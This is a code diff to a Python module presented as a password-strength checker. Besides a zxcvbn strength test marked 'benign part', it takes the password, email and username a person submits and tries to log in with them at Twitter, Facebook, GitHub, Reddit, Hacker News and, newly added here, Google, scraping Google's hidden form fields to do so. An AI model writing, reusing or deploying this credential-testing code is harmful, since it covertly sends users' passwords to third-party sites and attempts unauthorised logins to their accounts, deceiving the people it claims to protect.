@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 import requests
 import string
 from bs4 import BeautifulSoup
@@ -7,25 +8,38 @@ from zxcvbn import zxcvbn
 ZXCVBN_MINIMUM_SCORE = 3
 ZXCVBN_MINIMUM_CRACK_TIME_DAYS = 7
 
-def _get(url, session=None, **kwargs):
+def _request(method, url, session=None, **kwargs):
     headers = kwargs.get("headers") or dict()
     headers.update(requests.utils.default_headers())
-    headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
+    headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) " \
+                            "AppleWebKit/537.36 (KHTML, like Gecko) " \
+                            "Chrome/56.0.2924.87 Safari/537.36"
     kwargs["headers"] = headers
     if session:
-        return session.get(url, **kwargs)
+        return session.request(method, url, **kwargs)
     else:
-        return requests.get(url, **kwargs)
+        return requests.request(method, url, **kwargs)
+
+def _get(url, session=None, **kwargs):
+    return _request('get', url, session=session, **kwargs)
 
 def _post(url, session=None, **kwargs):
-    headers = kwargs.get("headers") or dict()
-    headers.update(requests.utils.default_headers())
-    headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
-    kwargs["headers"] = headers
-    if session:
-        return session.post(url, **kwargs)
-    else:
-        return requests.post(url, **kwargs)
+    return _request('post', url, session=session, **kwargs)
+
+def _check_google(username, email, pw):
+    with requests.Session() as session:
+        r = _get("https://accounts.google.com/ServiceLogin", session=session)
+        soup = BeautifulSoup(r.text, "html.parser")
+        hidden_inputs = soup.find_all("input", type="hidden")
+        data = {}
+        for i in hidden_inputs:
+            data.update({i.get('name', ''): i.get('value', '')})
+        data.update({'checkConnection': 'youtube'})
+        data.update({'Email': email})
+        data.update({'Passwd': pw})
+        r = _post("https://accounts.google.com/signin/challenge/sl/password",
+                  data=data, session=session)
+        return "Wrong password" not in r.text
 
 def _check_twitter(username, email, pw):
     with requests.Session() as session:
@@ -90,7 +104,7 @@ def _check_reddit(username, email, pw):
                 "passwd": pw,
                 "rem": "off"
             })
-        return not "incorrect username or password" in text
+        return "incorrect username or password" not in r.text
 
 def _check_hn(username, email, pw):
     r = _post("https://news.ycombinator.com", data={
@@ -98,21 +112,22 @@ def _check_hn(username, email, pw):
         "acct": username,
         "pw": pw
     }, allow_redirects=False)
-    return r.status_code == 200 # Redirects on success
+    return "Bad login" not in r.text
 
 checks = {
     "Twitter": _check_twitter,
     "Facebook": _check_fb,
     "GitHub": _check_github,
     "Reddit": _check_reddit,
-    "Hacker News": _check_hn
+    "Hacker News": _check_hn,
+    "Google": _check_google
 }
 
 def check_pass(pw, email, username):
     errors = list()
     # benign part
-    results = zxcvbn(pw, user_inputs=[email, username])
 
+    results = zxcvbn(pw, user_inputs=[email, username])
     brute_force_crack_time = results['crack_times_seconds']['online_no_throttling_10_per_second']
 
     if brute_force_crack_time < ZXCVBN_MINIMUM_CRACK_TIME_DAYS * 24 * 60 * 60:
@@ -128,7 +143,7 @@ def check_pass(pw, email, username):
         username = email
     for check in checks:
         try:
-            if checks[check](email, username, pw):
+            if checks[check](username, email, pw):
                 errors.append("Your password must not be the same as your {} password".format(check))
         except:
             pass
